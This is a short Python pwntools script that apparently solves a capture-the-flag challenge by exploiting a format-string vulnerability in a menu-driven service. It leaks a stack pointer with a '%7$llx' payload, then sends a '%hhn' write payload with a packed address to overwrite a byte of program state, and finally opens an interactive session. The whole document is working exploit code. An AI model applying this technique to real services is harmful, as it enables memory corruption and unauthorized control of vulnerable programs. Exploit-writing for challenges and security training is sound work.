import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

r.recvuntil(b'mode')
r.sendline("2")
r.recvuntil(b'name:')
r.sendline("%7$llx")
r.recvuntil(b'mode')
r.sendline("4")
r.recvuntil(b'is: ')

state = int(r.recvline(), 16)
print(f"State ptr is {state:x}")

r.recvuntil(b'mode')
r.sendline("2")
r.recvuntil(b'name:')
r.sendline(b"%d" * 30 + b"%hhn      " + struct.pack("<Q", state + 1))
r.recvuntil(b'mode')
r.sendline("4")
r.recvuntil(b'mode')
r.sendline("5")

r.interactive()
